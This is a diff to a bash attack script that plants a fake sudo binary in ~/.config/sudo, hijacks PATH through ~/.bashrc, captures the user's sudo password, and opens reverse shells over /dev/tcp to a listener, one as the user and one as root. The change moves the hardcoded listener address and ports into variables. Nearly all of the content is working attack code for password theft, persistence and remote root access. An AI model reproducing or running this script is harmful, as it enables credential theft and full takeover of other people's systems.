@@ -1,5 +1,9 @@
 #!/bin/bash
 
+LISTENER_IP="127.0.0.1"
+LISTENER1_PORT="1337" #Listener for user shell
+LISTENER2_PORT="9001" #Listener for root shell
+
 if [ ! -d ~/.config/sudo ]
 then
     mkdir -p ~/.config/sudo
@@ -37,7 +41,7 @@ else
     mv ~/.bashrc.bak ~/.bashrc
     fi
     rm ~/.config/sudo/sudo
-    echo "$pwd" | sudo -S disown !$ $(sudo /bin/bash -i  > /dev/tcp/192.168.0.118/1337 0<&1 2>&1) &
+    echo "$pwd" | sudo -S disown !$ $(sudo /bin/bash -i  > /dev/tcp/$LISTENER_IP/$LISTENER1_PORT 0<&1 2>&1) &
     fi
 fi
 EOF
@@ -51,5 +55,5 @@ else
     cp ~/.bashrc ~/.bashrc.bak
     echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
 fi
-disown !$ $(/bin/bash -i  > /dev/tcp/192.168.0.118/4444 0<&1 2>&1) &
+disown !$ $(/bin/bash -i  > /dev/tcp/$LISTENER_IP/$LISTENER2_PORT 0<&1 2>&1) &
 bash
